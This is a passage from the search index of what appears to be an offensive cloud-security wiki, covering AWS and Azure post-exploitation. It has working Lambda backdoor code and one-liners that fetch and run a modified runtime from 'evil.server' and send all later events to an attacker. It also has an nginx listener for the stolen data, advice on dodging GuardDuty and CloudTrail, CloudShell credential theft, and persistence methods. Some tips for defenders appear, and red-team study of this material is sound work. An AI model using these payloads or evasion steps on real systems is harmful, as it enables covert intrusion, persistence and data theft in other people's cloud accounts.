permissions, you can query the AWS API to view the user data of specific EC2 instances. This requires you to know the instance-id of the target EC2 instance. To query the user data we will use the describe-instance-attribute action. The result will be base64 encoded.</p> <pre><code>user@host:~$ aws ec2 describe-instance-attribute --instance-id i-abc123... --attribute userData\n</code></pre>","location":"aws/general-knowledge/introduction_user_data/#api"},{"title":"Using Stolen IAM Credentials","text":"<p>As a Penetration Tester or Red Teamer it is likely you will stumble into AWS IAM credentials during an assessment. The following is a step by step guide on how you can use them, things to consider, and methods to avoid detection.</p>","location":"aws/general-knowledge/using_stolen_iam_credentials/"},{"title":"IAM Credential Characteristics","text":"<p>In AWS there are typically two types of credentials you will be working with, long term (access keys) and short term.</p> <p>Long term credentials will have an access key that starts with <code>AKIA</code> and will be 20 characters long. In addition to the access key there will also be a secret access key which is 40 characters long. With these two keys, you can potentially make requests against the AWS API. As the name implies, these credentials have no specified lifespan and will be useable until they are intentionally disabled/deactivated. As a result, this makes them not recommended from a security perspective. Temporary security credentials are preferred.</p> <p>Temporary credentials, by comparison, will have an access key that starts with <code>ASIA</code>, be 20 characters long, and also have a 40 character secret key. In addition, temporary security credentials will also have a session token (sometimes referred to as a security token). The session token will be base64 encoded and quite long. With these 3 credentials combined you can potentially make requests to the AWS API. As the name implies, these credentials have a temporary lifespan that is determined when they were created. It can be as short as 15 minutes, and as long as several hours.</p>","location":"aws/general-knowledge/using_stolen_iam_credentials/#iam-credential-characteristics"},{"title":"Working with the Keys","text":"<p>After gathering the credentials you will likely want to use them with the AWS CLI. There are a few ways to do this, however setting them as environment variables is likely the easiest. </p> <p>To do this with long term credentials, set the following environment variables.</p> <pre><code>export AWS_ACCESS_KEY_ID=AKIAEXAMPLEEXAMPLEEE\nexport AWS_SECRET_ACCESS_KEY=EXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLESEXAM\n</code></pre> <p>To do this with short term credentials, set the following environment variables.</p> <pre><code>export AWS_ACCESS_KEY_ID=ASIAEXAMPLEEXAMPLEEE\nexport AWS_SECRET_ACCESS_KEY=EXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLESEXAM\nexport AWS_SESSION_TOKEN=EXAMPLEEXAMPLEEXAMPLE...&lt;snip&gt;\n</code></pre>  <p>Note</p> <p>You may also have to specify an AWS region. This can be globally set with the <code>aws configure</code> command or through the <code>AWS_REGION</code> environment variable.</p>","location":"aws/general-knowledge/using_stolen_iam_credentials/#working-with-the-keys"},{"title":"Determining Validity","text":"<p>Now that you have credentials and have them setup to use, how can you determine if they are valid (not expired or deactivated)? The simplest way would be to make use of the sts:GetCallerIdentity API call. This method is helpful because it will allow us to determine if the credentials are valid and it will also tell us useful information such as the name of the role/user associated with these credentials and the AWS account ID they belong to.</p> <p>As an added bonus, we can be confident this API call will always work. From the documentation, \"No permissions are required to perform this operation. If an administrator adds a policy to your IAM user or role that explicitly denies access to the sts:GetCallerIdentity action, you can still perform this operation\".</p> <pre><code>$ aws sts get-caller-identity\n{\n    \"UserId\": \"AROAEXAMPLEEXAMPLEEXA:Nick\",\n    \"Account\": \"123456789123\",\n    \"Arn\": \"arn:aws:sts::123456789123:assumed-role/blah/Nick\"\n}\n</code></pre>  <p>Tip</p> <p>For defensive security professionals, it may be worthwhile to alert on invocations of <code>sts:GetCallerIdentity</code> from identities that have no history of calling it. For example, if an application server in a production environment has never called it before, that may be an indication of compromise.</p> <p>It is worth noting that <code>sts:GetCallerIdentity</code> may be legitimately used by a large number of projects, and that individual developers may use it as well. To attempt to reduce the number of false positives, it would be best to only alert on identities which have no history of calling it.</p>","location":"aws/general-knowledge/using_stolen_iam_credentials/#determining-validity"},{"title":"Operational Security Considerations","text":"<p>If you are attempting to maintain stealth, <code>sts:GetCallerIdentity</code> may be a risk. This API call logs to CloudTrail which means that defenders will have a log with additional details that this occurred. To get around this, we can make use of data events.</p> <p>Data events are high-volume API calls for resources in an AWS account. Because of the number of times these APIs may be called, they are not logged to CloudTrail by default and in some cases they cannot be logged at all.</p> <p>An example of this would be sns:Publish. By making this API call (and supplying a valid AWS account ID) we can get similar information as <code>sts:GetCallerIdentity</code>.</p> <pre><code>$ aws sns publish --topic-arn arn:aws:sns:us-east-1:*account id*:aaa --message aaa\n\nAn error occurred (AuthorizationError) when calling the Publish operation: User: arn:aws:sts::123456789123:assumed-role/example_role/i-00000000000000000 is not authorized to perform: SNS:Publish on resource: arn:aws:sns:us-east-1:*account id*:aaa\n</code></pre> <p>For more information on this technique, please see its article.</p>","location":"aws/general-knowledge/using_stolen_iam_credentials/#operational-security-considerations"},{"title":"Avoiding Detection","text":"<p>There are situations where simply using the credentials could alert defenders to your presence. As a result, it is a good idea to be mindful of these circumstances to avoid being caught.</p>","location":"aws/general-knowledge/using_stolen_iam_credentials/#avoiding-detection"},{"title":"GuardDuty Pentest Findings and CLI User Agents","text":"<p>If you are using a \"pentesting\" Linux distribution such as Kali Linux, Parrot Security, or Pentoo Linux you will immediately trigger a PenTest GuardDuty finding. This is because the AWS CLI will send along a user agent string which contains information about the operating system making the API call.</p> <p>In order to avoid this, it is best to make use of a \"safe\" operating system, such as Windows, Mac OS, or Ubuntu. If you are short on time, or simply MUST use one of these Linux distributions, you can modify your botocore library with a hard-coded user agent.</p>  <p>Tip</p> <p>Are you going up against an apex blue team who will detect anything? It may be a good idea to spoof a user agent string that one would expect in the environment. For example, if these IAM credentials belong to a developer who uses a Windows workstation, it would be very strange for API calls to suddenly start having a user agent with a Linux operating system.</p> <p>Defenders, this may also be worth looking into for detection purposes.</p>  <p>For more information on this, please see its article.</p>","location":"aws/general-knowledge/using_stolen_iam_credentials/#guardduty-pentest-findings-and-cli-user-agents"},{"title":"GuardDuty Credential Exfiltration","text":"<p>Note</p> <p>This section only applies to IAM credentials taken from the Instance Metadata Service of an EC2 instance. It does not apply to other IAM credentials.</p>  <p>When using IAM credentials taken from an EC2 instance, you run the risk of triggering the UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS GuardDuty finding. This finding alerts on scenarios in which IAM credentials from an EC2 instance are used from outside AWS (E.X your home IP address).</p> <p>This is particularly relevant in scenarios in which you have access to the IAM credentials, but not the host (Server Side Request Forgery).</p> <p>To get around this, we can make use of VPC Endpoints which will not trigger this alert. To make things easier, the SneakyEndpoints tool was developed to allow you to quickly stand up infrastructure to bypass this detection.</p> <p>For more information on this, please see its article.</p>","location":"aws/general-knowledge/using_stolen_iam_credentials/#guardduty-credential-exfiltration"},{"title":"Situational Awareness","text":"<p>Now that you have everything set up and you know what to look out for, your next question may be, \"what is in this AWS account?\". If you are performing a no-knowledge assessment, and thus, don't have any insights into what services are running in the account, it makes it difficult to know what to target or look into.</p> <p>One option would be to enumerate the service-linked roles in the account. A service-linked role is a special kind of IAM role that allows an AWS service to perform actions in your account. Because of this, we can potentially enumerate them without authentication. </p> <p>From the previous validity checking step, we will know the AWS account ID we are operating in. That, combined with this technique will allow us to enumerate what services the AWS account uses. This can be helpful to answer questions such as, \"Is our target using GuardDuty? Is this account a part of an organization? Are they using containers (ECS, EKS), or are they using EC2?\".</p> <p>For more information on this, please see its article.</p>","location":"aws/general-knowledge/using_stolen_iam_credentials/#situational-awareness"},{"title":"Get IAM Credentials from a Console Session","text":"<p>Original Research: Christophe Tafani-Dereeper</p> <p>When performing a penetration test or red team assessment, it is not uncommon to gain access to a developer's machine. This presents an opportunity for you to jump into AWS infrastructure via credentials on the system. For a myriad of reasons you may not have access to credentials in the <code>.aws</code> folder, but instead have access to their browser's session cookies (for example via cookies.sqlite in FireFox).</p> <p>Gaining access to the Console is great, but it may not be ideal. You may want to use certain tools that would instead require IAM credentials.</p> <p>To get around this, we can leverage CloudShell. CloudShell exposes IAM credentials via an undocumented endpoint on port 1338. After loading session cookies from the victim into your browser, you can navigate to CloudShell and issue the following commands to get IAM credentials.</p> <pre><code>[user@cloudshell]$ TOKEN=$(curl -X PUT localhost:1338/latest/api/token -H \"X-aws-ec2-metadata-token-ttl-seconds: 60\")\n\n[user@cloudshell]$ curl localhost:1338/latest/meta-data/container/security-credentials -H \"X-aws-ec2-metadata-token: $TOKEN\"\n</code></pre>","location":"aws/post_exploitation/get_iam_creds_from_console_session/"},{"title":"Intercept SSM Communications","text":"<p>Original Research: Nick Frichette Proof of Concept: GitHub</p> <p>The SSM Agent is responsible for allowing EC2 instances to communicate with SSM services. The agent authenticates with SSM via the IAM role and the credentials in the Metadata Service. As a result, if you gain access to an EC2 instance or its IAM credentials you can spoof the agent and intercept EC2 Messages and SSM Sessions.</p> <p>For an in depth explanation of how this works, please see the original research. </p>  <p>Warning</p> <p>The tools used in this page are proof of concept, and should not be used for serious use cases. If you create or find a more production-ready tool please open an issue.</p>","location":"aws/post_exploitation/intercept_ssm_communications/"},{"title":"Intercept EC2 Messages","text":"<p>The normal operations of the SSM Agent is to poll for messages it has been sent. We can abuse this functionality by frequently polling ourselves. Doing so, will increase the likelihood (to a near guarantee) that we receive the messages before the real SSM agent does.</p> <p>By abusing this functionality we can intercept the EC2 messages and response with our own output, allowing us to force a \"Success\" response.</p> <p>Using the ssm-send-command-interception.py PoC:</p>  <p></p>   <p></p>","location":"aws/post_exploitation/intercept_ssm_communications/#intercept-ec2-messages"},{"title":"Intercept SSM Sessions","text":"<p>Normally the SSM Agent will spawn a WebSocket connection back to SSM. This first WebSocket is the control channel and is responsible for spawning the data channels (which actually process the information). Due to this setup, we can spawn our own control channel and intercept all incoming connections. This can allow us to intercept or modify the communications happening, and potentially allow us to intercept sensitive commands and credentials.</p> <p>Using the ssm-session-interception.py PoC:</p>  <p></p>","location":"aws/post_exploitation/intercept_ssm_communications/#intercept-ssm-sessions"},{"title":"Lambda Persistence","text":"<p>Original Research: Yuval Avrahami Link to Research: Unit 42: Gaining Persistency on Vulnerable Lambdas Additional Reading: Revisiting Lambda Persistence</p>  <p>Warning</p> <p>Depending on the specific runtime and tools available, you will likely have to change the approach taken to gain persistence in a Lambda function. The general concepts should serve as a guide for a more specific attack you develop.</p>  <p>After finding a remote code execution vulnerability in a Lambda function, you'll probably want to establish persistence. The steps to do this will depend on the specific runtime that is being used by the Lambda function. Below the Python and Ruby runtimes are used as an example.</p>  <p>Note</p> <p>See the \"Creating a Listener\" section at the bottom of this page for how to setup a listener for exfiltrated data.</p>","location":"aws/post_exploitation/lambda_persistence/"},{"title":"Python Runtime","text":"<p>After identifying that your target is using the Python runtime, you'll need a copy of the <code>/var/runtime/bootstrap.py</code> file. You can get this by either creating your own Lambda function and copying it, or by leaking it from the target Lambda function.</p> <p>Next, you'll want to modify this runtime with some logic to backdoor it. This can be simply done with a few lines such as the following:</p>  <p></p>   <p>Note</p> <p>You can customize what the backdoor does, depending on what you're looking to do. Maybe you want to leak a specific user's data. Maybe you just want Cookies. It's up to you!</p>  <p>With the <code>bootstrap.py</code> file backdoored, you'll want to host it in a location that is accessible for the Lambda function to pull down. </p> <p>The next step is creating a one-liner to pull down this modified code, as well as to terminate the current event in the Runtime API. This can be done by posting to a specific endpoint with the current request ID. All together, that code should look something like this:</p> <pre><code>import urllib3\nimport os\nhttp = urllib3.PoolManager()\n\n# Writing the new bootstrap to a file\nr = http.request('GET', 'https://evil.server/bootstrap.py')\nw = open('/tmp/bootstrap.py', 'w')\nw.write(r.data.decode('utf-8'))\nw.close()\n\n# Getting the current request ID\nr = http.request('GET', 'http://127.0.0.1:9001/2018-06-01/runtime/invocation/next')\nrid = r.headers['Lambda-Runtime-Aws-Request-Id']\n\n# End the current event\nhttp.request('POST', f'http://127.0.0.1:9001/2018-06-01/runtime/invocation/{rid}/response', body='null', headers={'Content-Type':'application/x-www-form-urlencoded'})\n\n# Swap the runtimes\nos.system('python3 /tmp/bootstrap.py')\n</code></pre> <p>Or as a long one-liner (don't forget to change the hostname):</p> <pre><code>python3 -c \"import urllib3;import os;http = urllib3.PoolManager();r = http.request('GET', 'https://evil.server/bootstrap.py');w = open('/tmp/bootstrap.py', 'w');w.write(r.data.decode('utf-8'));w.close();r = http.request('GET', 'http://127.0.0.1:9001/2018-06-01/runtime/invocation/next');rid = r.headers['Lambda-Runtime-Aws-Request-Id'];http.request('POST', f'http://127.0.0.1:9001/2018-06-01/runtime/invocation/{rid}/response', body='null', headers={'Content-Type':'application/x-www-form-urlencoded'});os.system('python3 /tmp/bootstrap.py')\"\n</code></pre> <p>From here on, all subsequent events should be leaked to the attacker. Remember that if the Lambda function is not used for 5-15 minutes, it will become \"cold\" and you will lose access to the persistence you've established. You can execute the function again to keep it \"warm\" or you can simply reestablish persistence.</p>","location":"aws/post_exploitation/lambda_persistence/#python-runtime"},{"title":"Ruby Runtime","text":"<p>After identifying that your target is using the Python runtime, you\u2019ll need a copy of the <code>/var/runtime/lib/runtime.rb</code> file. You can get this by either creating your own Lambda function and copying it, or by leaking it from the target Lambda function.</p> <p>Next, you\u2019ll want to modify this runtime with some logic to backdoor it. This can be simply done with a few lines such as the following:</p>  <p></p>   <p></p>  <p>With the <code>runtime.rb</code> file backdoored, you\u2019ll want to host it in a location that is accessible for the Lambda function to pull down. Note, you'll likely want to rename it to something like <code>run.rb</code>. This is because you'll want to create a symbolic link between everything in <code>/var/runtime/lib</code> to <code>/tmp</code>. This will ensure your modified <code>runtime.rb</code> file can access all the additional libraries it needs.</p> <p>The next step is creating a one-liner to create those symbolic links, pull down this modified code, and execute it as well as to terminate the current event in the Runtime API. This can be done by posting to a specific endpoint with the current request ID. All together, that code should look something like this:</p> <pre><code>require 'net/http'\n\n# Writing the new runtime to a file\nuri = URI('https://evil.server/run.rb')\nr = Net::HTTP.get_response(uri)\nFile.write('/tmp/run.rb', r.body)\n\n# Getting the current request ID\nuri = URI('http://127.0.0.1:9001/2018-06-01/runtime/invocation/next')\nr = Net::HTTP.get_response(uri)\nrid = r.header['Lambda-Runtime-Aws-Request-Id']\n\n# End the current request\nuri = URI('http://127.0.0.1:9001/2018-06-01/runtime/invocation/'+rid+'/response')\nNet::HTTP.post(uri, 'null')\n</code></pre> <p>Or as a long one-liner (don\u2019t forget to change the hostname, create the symbolic links, or execute the code in the background):</p> <pre><code>ln -s /var/runtime/lib/* /tmp &amp;&amp; ruby -e \"require 'net/http';uri = URI('https://evil.server/run.rb');r = Net::HTTP.get_response(uri);File.write('/tmp/run.rb', r.body);uri = URI('http://127.0.0.1:9001/2018-06-01/runtime/invocation/next');r = Net::HTTP.get_response(uri);rid = r.header['Lambda-Runtime-Aws-Request-Id'];uri = URI('http://127.0.0.1:9001/2018-06-01/runtime/invocation/'+rid+'/response');Net::HTTP.post(uri, 'null')\" &amp;&amp; ruby /tmp/run.rb &amp;\n</code></pre> <p>From here on, all subsequent events should be leaked to the attacker. Remember that if the Lambda function is not used for 5-15 minutes, it will become \u201ccold\u201d and you will lose access to the persistence you\u2019ve established. You can execute the function again to keep it \u201cwarm\u201d or you can simply reestablish persistence.</p>","location":"aws/post_exploitation/lambda_persistence/#ruby-runtime"},{"title":"Creating a Listener","text":"<p>How you receive leaked events is up to you. The author found that the simplest way was via post requests to an Nginx server. The configuration was simple. First, outside of the server block, include a line like <code>log_format postdata $request_body</code>.</p> <p>Next, include the following inside the server block:</p> <pre><code>location = /post {\n    access_log /var/log/nginx/postdata.log postdata;\n    proxy_pass http://127.0.0.1/post_extra;\n}\nlocation = /post_extra {\n    access_log off;\n    return 200;\n}\n</code></pre> <p>After restarting Nginx, all logs received via post requests should be stored in <code>/var/log/nginx/postdata.log</code>.</p>","location":"aws/post_exploitation/lambda_persistence/#creating-a-listener"},{"title":"Role Chain Juggling","text":"<p>Original Research: Daniel Heinsen Link to Tool: GitHub</p> <p>When doing an assessment in AWS you may want to maintain access for an extended period of time. You may not have the ability to create a new IAM user, or create a new key for existing users. How else can you extend your access? Role Chain Juggling.</p> <p>Role chaining is a recognized functionality of AWS in that you can use one assumed role to assume another one. When this happens the expiration field of the credentials is refreshed. This allows us to keep refreshing credentials over an over again.</p> <p>Through this, you can extend your access by chaining assume-role calls.</p>  <p>Note</p> <p>You can chain the same role multiple times so long as the Trust Policy is configured correctly. Additionally, finding roles that can assume each other will allow you to cycle back and forth.</p>  <p>To automate this work Daniel Heinsen developed a tool to keep the juggling going.</p> <pre><code>user@host:$ ./aws_role_juggler.py -h\nusage: aws_role_juggler.py [-h] [-r ROLE_LIST [ROLE_LIST ...]]\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -r ROLE_LIST [ROLE_LIST ...], --role-list ROLE_LIST [ROLE_LIST ...]\n</code></pre>","location":"aws/post_exploitation/role-chain-juggling/"},{"title":"Run Shell Commands on EC2 with Send Command or Session Manager","text":"<p>After escalating privileges in a target AWS account or otherwise gaining privileged access you may want to run commands on EC2 instances in the account. This article hopes to provide a quick and referenceable cheat sheet on how to do this via ssm:SendCommand or ssm:StartSession.</p>  <p>Tip</p> <p>By default, the commands that are issued are not logged to CloudTrail. Specifically they are \"HIDDEN_DUE_TO_SECURITY_REASONS\". As a result, if an adversary were to leverage this tactic against an environment, defenders would need to get information about those commands from host based controls. Defenders, this is an excellent capability to validate. Alternatively, offensive security teams can do the testing.</p>","location":"aws/post_exploitation/run_shell_commands_on_ec2/"},{"title":"Send Command","text":"<p>Required IAM Permission: ssm:SendCommand Recommended But Not Strictly Required: ssm:ListCommandInvocations, ec2:DescribeInstances</p> <p>You can send arbitrary shell commands to EC2 instances from the AWS CLI via the following:</p> <pre><code>aws ssm send-command \\\n--instance-ids \"i-00000000000000000\" \\\n--document-name \"AWS-RunShellScript\"\n--parameters commands=\"*shell commands here*\"\n</code></pre> <p>If you're just looking to run a quick C2 payload, or perhaps create a new user this will likely be enough. However, if you also want to retrieve the output of the command you will need to make a ssm:ListCommandInvocations call as well.</p> <p>If you would like to retrieve the output, make a note of the <code>CommandId</code> returned to you in the Send Command call. After a short period of time (to let the command run) you can use this Id to lookup the results. You can do this with the following:</p> <pre><code>aws ssm list-command-invocations \\\n--command-id \"command_id_guid\" \\\n--details\n</code></pre>  <p>Note</p> <p>The <code>--details</code> is required to view the output of the command.</p>  <p>The output of the command will be in the <code>Output</code> section under <code>CommandPlugins</code>.</p>","location":"aws/post_exploitation/run_shell_commands_on_ec2/#send-command"},{"title":"Session Manager","text":"<p>Required IAM Permission: ssm:StartSession</p> <p>If instead you'd like a more interactive shell experience, you can make use of Session Manager. Session Manager allows you to have an SSH-esc experience, making it easy to interact with EC2 instances.</p> <p>To begin, you will first need to install the SSM Session Manager Plugin. The specifics of this will depend on what operating system you are using.</p> <p>With that installed, you can then run the following command to start an interactive session.</p> <pre><code>aws ssm start-session --target instance-id\n</code></pre>","location":"aws/post_exploitation/run_shell_commands_on_ec2/#session-manager"},{"title":"S3 File ACL Persistence","text":"","location":"aws/post_exploitation/s3_acl_persistence/"},{"title":"Requirements","text":"<p>For this scenario to work, you will need to have s3:PutBucketAcl, s3:PutObjectAcl, or PutObjectVersionAcl on the target s3 bucket or associated object.</p>","location":"aws/post_exploitation/s3_acl_persistence/#requirements"},{"title":"Purpose","text":"<p>When doing an assessment in AWS you may want to maintain access for an extended period of time, but you may not have the ability to create a new IAM user, create a new key for existing users, or even perform IAM role-chain juggling. How else can you extend your access? By backdooring key S3 resources using S3 Access Control Lists (ACLs).  </p>","location":"aws/post_exploitation/s3_acl_persistence/#purpose"},{"title":"Background on Sensitive S3 Use Cases","text":"<p>Many organizations have grown to use AWS S3 to store Terraform state files, CloudFormation Templates, SSM scripts, application source code, and/or automation scripts used to manage specific account resources (EC2 instances, Lambda Functions, etc.)  During post-exploitation, you may identify opportunities to access these resources. Provisioning write, or in some cases read only access to these resources, may provide persistent access to credentials for the AWS account and/or resources provisioned in the account. Furthermore, write access specifically may allow an attacker to update configuration files, source code for applications, and/or automation code that modifies downstream resources in the account. On the next update/execution of the relevant data/code, this may allow an attacker to further extend access to other resources in the account, or even beyond the specific AWS account accessed. This brings us to the method: S3 ACL Access Control.  </p>","location":"aws/post_exploitation/s3_acl_persistence/#background-on-sensitive-s3-use-cases"},{"title":"Technique","text":"<p>S3 ACL Access Control is a recognized functionality of AWS in that you can use an access control list to allow access to S3 buckets from outside your own AWS account without configuring an Identity-based or Resource-based IAM policy. While many organizations may be prepared to alert on S3 buckets made public via resource policy, this alerting may not extend to capabilities associated with bucket or object ACLs. Furthermore, subtler configurations that expose bucket or object resources to other accounts via ACLs may go undetected by organizations, even those with strong alerting capabilities. Using these permissions, you can extend your access by allowing other AWS accounts you control to read or write objects, buckets, and bucket ACLs. Furthermore, the access can be extended to AUTHENTICATED USERS, which is a term AWS uses to describe any AWS IAM principal in any other AWS account. The access can also be extended to ANY USER which is a term AWS uses to describe anonymous access that does not require authentication.</p>","location":"aws/post_exploitation/s3_acl_persistence/#technique"},{"title":"Key Considerations","text":"<ol> <li>Bucket Public Access Block will prevent S3 bucket ACLs from being configured to allow public (ANY USER) access. If configured, it will provide some limitations to this technique.</li> </ol>","location":"aws/post_exploitation/s3_acl_persistence/#key-considerations"},{"title":"User Data Script Persistence","text":"<p>When using EC2 instances a common design pattern is to define a user data script to be run when an instance is first started or after a reboot. These scripts are typically used to install software, download a config, etc. Additionally these scripts are run as root or System which makes them even more useful. Should we gain access to an EC2 instance we may be able to persist by abusing user data scripts via two different methods.</p>","location":"aws/post_exploitation/user_data_script_persistence/"},{"title":"Modify the User Data Script","text":"<p>Required IAM Permission: modify-instance-attribute Recommended but not required: start-instances, describe-instances, stop-instances (makes things go faster, requires less enumeration. The instance must be stopped to alter the user data)  </p> <p>If we have permission to directly modify the user data scripts, we can potentially persist by adding our own backdoor to it. To do this, we must stop the instance because user data scripts can only be modified when the instance is stopped. You could theoretically wait for this to happen naturally, have a script that constantly tries to modify it, or stop it yourself if you have permissions to do so.</p> <p>The steps to modify user data scripts can be found here.</p>","location":"aws/post_exploitation/user_data_script_persistence/#modify-the-user-data-script"},{"title":"Modify a Resource Called by the Script","text":"<p>In situations where we cannot modify the user data script itself, we may be able to modify a resource called by the script. Say for example a script is downloaded by an S3 bucket, we may be able to add our backdoor to it.</p>","location":"aws/post_exploitation/user_data_script_persistence/#modify-a-resource-called-by-the-script"},{"title":"Abusing Managed Identities","text":"<p>Original Research: 0xPwN Blog - Create an Azure Vulnerable Lab: Part #4 \u2013 Managed Identities</p> <p>Using Managed Identities it is possible to grant a resource (such as VM/WebApp/Function/etc) access to other resource (such as Vaults/Storage Accounts/etc.) For example, if we want to give our web application access to a private storage account container without having to deal with how we safely store connection strings in config files or source code, we could use a managed identity.</p> <pre><code>Compute Resource --&gt; Managed Identity --&gt; Assigned Role(s) --&gt; Storage Account --&gt; Container\n</code></pre> <p>A Managed Identity can be a System or User identity. A System identity is bound to the resource, but a User identity is independent.</p>","location":"azure/abusing-managed-identities/"},{"title":"Setup Azure Managed Identity","text":"<p>First we enable the managed identity for the web application:</p> <p></p> <p>Once enabled, we are given the possibility to configure the roles assigned for this identity (i.e: permissions granted to the service that we enabled the identity for).</p> <p></p> <p>Lastly, we assign one or more roles (which is a set of permissions) for that identity. A role can be assigned at Subscription level, Resource group, Storage Account, Vault or SQL and it propagates \u201cdownwards\u201d in the Azure architecture layer.</p> <p>The default Owner, owning the resource, and Contributor, read/write content of the resource, roles have the most permissions.</p> <p></p> <p>Under each role, we can see in details what permissions are included. Azure allows also to configure custom roles in case the built-in ones are not suitable for your case.</p> <p></p> <p>Similarly, to see who has permissions granted for a give resource, we can check that under the Access Control (IAM) -&gt; View access to this resource.</p> <p></p> <p>So in our case, we should see under the Storage Account that the web application has Reader and Data Access:</p> <p></p>","location":"azure/abusing-managed-identities/#setup-azure-managed-identity"},{"title":"Next steps","text":"<p>Now that we have the basics of how Managed Identity works, let\u2019s see how can we exploit this. Since the web application has access to the storage account, and we compromised the web application, we should be able to get as well access to the storage account. Long story short, we get the same permissions that the resource we compromised had. Based on how poorly the Identity roles are assigned, it could even be the case that the permissions are assigned at Subscription level, effectively granting us access to all resources inside it!</p> <p></p> <p>While in our case it looks that the permissions are proper (we are limiting access only to the Storage Account that we need access to) and limit the roles to Reader and Data Access (instead of Contributor or Owner), there is still a catch. Our web app needs permissions only to the \u201cimages\u201d container, but the managed identity configured has enough permissions to list the access keys to the whole Storage Account granting us access to any other containers hosted in the same account. </p>","location":"azure/abusing-managed-identities/#next-steps"},{"title":"Exploiting Azure Managed Identity","text":"<p>Abusing the command injection on the web app, we can make a curl request to the $IDENTITY_ENDPOINT URL stored in the environment variables and get an access token and account id (client id in the response) which can be used to authenticate to Azure. <pre><code>curl \"$IDENTITY_ENDPOINT?resource=https://management.azure.com/&amp;api-version=2017-09-01\" -H secret:$IDENTITY_HEADER\n</code></pre> </p> <p>Using the Azure Powershell module, we can connect to Azure with the access token:  <pre><code>PS&gt; Install-Module -Name Az -Repository PSGallery -Force\nPS&gt; Connect-AzAccount -AccessToken &lt;access_token&gt; -AccountId &lt;client_id&gt;\n</code></pre></p> <p>Once connected, you should see details about the Subscription and Tenant that the Managed Identity we are impersonating has access to. Using the Get-AzResource Azure Powershell cmdlet, we can check which resources inside the subscription we can access:</p> <p></p> <p>To list the roles assigned to the managed, we can use the Azure Powershell cmdlet Get-AzRoleAssignment. This cmdlet requires additionally a graph token which we can get from the https://graph.microsoft.com/ endpoint, but also the permission to list roles and permissions for identities which our Identity does not have.</p> <p>However, we can still try to access the Storage Account keys without these permissions and see if we are successful. For that we will use the Get-AzStorageAccountKey cmdlet with the Resource Group Name and Account Name that we found in the previous step.</p> <p>Get storage account keys:</p> <pre><code>&gt;Get-AzStorageAccountKey -ResourceGroupName \"0xpwnlab\" -AccountName \"0xpwnstorageacc\"\n\nKeyName Value                       Permissions CreationTime\n------- -----                       ----------- ----------\nkey1    L175hccq[...]lH9DJ==        Full 3/12/20...\nkey2    vcZiPzJp[...]ZkKvA==        Full 3/12/20...\n</code></pre> <p>http://aka.ms/storage-explorer</p> <p>If the above command returns two keys, than it means that our identity had permissions to list them. Let\u2019s use these keys in Azure Storage Explorer and see if there are other containers stored on the same account. In the Azure Storage Explorer, we click the connect icon and select storage account or service.</p> <p></p> <p>On the second step, this time we select the Account name and key option:</p> <p></p> <p>For the Account name we use the name that we enumerated in the Get-AzResource step, while for the key we can use either of the two we found:</p> <p></p> <p>Once we connect, on the left side menu we should find a new storage account, we see 2 containers: the images container used by the web app, but also another one containing the flag. </p> <p></p> <p>And that\u2019s it! We have just seen how abusing a command injection into a web app, we discovered that it had a managed identity associated to it. After we got the JWT access token, we connected to Azure using the Azure Powershell and enumerated the resources that we have access to. The improper permissions set for the Managed Identity allowed us to read the access key for the whole Storage Account and discover another private container that was not referenced anywhere, containing the flag sensitive information. </p>","location":"azure/abusing-managed-identities/#exploiting-azure-managed-identity"},{"title":"Anonymous Blob Access","text":"<p>Original Research: 0xPwN Blog - Create an Azure Vulnerable Lab: Part #1 \u2013 Anonymous Blob Access </p> <p>\"Storage Accounts\" is the service provided by Azure to store data in the cloud. A storage account can used to store:</p> <ul> <li>Blobs</li> <li>File shares</li> <li>Tables</li> <li>Queues</li> <li>VM disks</li> </ul> <p></p> <p>For this tutorial, we will focus on the Blobs section. Blobs are stored within a container, and we can have multiple containers within a storage account. When we create a container, Azure will ask on the permissions that we grant for public access. We can chose between:</p> <ul> <li>Private Access \u2013 no anonymous access is allowed</li> <li>Blob Access \u2013 we can access the blobs anonymously, as long as we know the full URL (container name + blob name)</li> <li>Container Access \u2013 we can access the blobs anonymously, as long we know the container name (directory listing is enabled, and we can see all the files stored inside the container)</li> </ul> <p>As you might have guessed, granting Container Access permission can be easily abused to download all the files stored within the container without any permissions as the only things required to be known are the storage account name and the container name, both of which can be enumerated with wordlists.</p>","location":"azure/anonymous-blob-access/"},{"title":"Exploiting Anonymous Blob Access","text":"<p>Now, there are thousands of articles explaining how this can be abused and how to search for insecure storage in Azure, but to make things easier I\u2019ll do a TL:DR. One of the easiest way is to use MicroBurst, provide the storage account name to search for, and it\u2019ll check if the containers exists based on a wordlist saved in the Misc/permutations.txt:</p> <pre><code>PS &gt; import-module .\\MicroBurst.psm1\nPS&gt; Invoke-EnumerateAzureBlobs -Base 0xpwnstorageacc\nFound Storage Account - 0xpwnstorageacc.blob.core.windows.net\nFound Container - 0xpwnstorageacc.blob.core.windows.net/public\nPublic File Available: https://0xpwnstorageacc.blob.core.windows.net/public/flag.txt\n</code></pre> <p>Alternatively adding <code>?restype=container&amp;comp=list</code> after the container name: <pre><code>https://&lt;storage_account&gt;.blob.core.windows.net/&lt;container&gt;?restype=container&amp;comp=list\n</code></pre> Output: <pre><code>&lt;EnumerationResults ContainerName=\"https://0xpwnstorageacc.blob.core.windows.net/public\"&gt;\n    &lt;Blobs&gt;\n        &lt;Blob&gt;\n            &lt;Name&gt;flag.txt&lt;/Name&gt;\n            &lt;Url&gt;\nhttps://0xpwnstorageacc.blob.core.windows.net/public/flag.txt\n&lt;/Url&gt;\n            &lt;Properties&gt;\n                &lt;Last-Modified&gt;Sat, 05 Mar 2022 18:02:14 GMT&lt;/Last-Modified&gt;\n                &lt;Etag&gt;0x8D9FED247B7848D&lt;/Etag&gt;\n                &lt;Content-Length&gt;34&lt;/Content-Length&gt;\n                &lt;Content-Type&gt;text/plain&lt;/Content-Type&gt;\n                &lt;Content-Encoding/&gt;\n                &lt;Content-Language/&gt;\n                &lt;Content-MD5&gt;lur6Yvd173x6Zl1HUGvtag==&lt;/Content-MD5&gt;\n                &lt;Cache-Control/&gt;\n                &lt;BlobType&gt;BlockBlob&lt;/BlobType&gt;\n                &lt;LeaseStatus&gt;unlocked&lt;/LeaseStatus&gt;\n            &lt;/Properties&gt;\n        &lt;/Blob&gt;\n    &lt;/Blobs&gt;\n    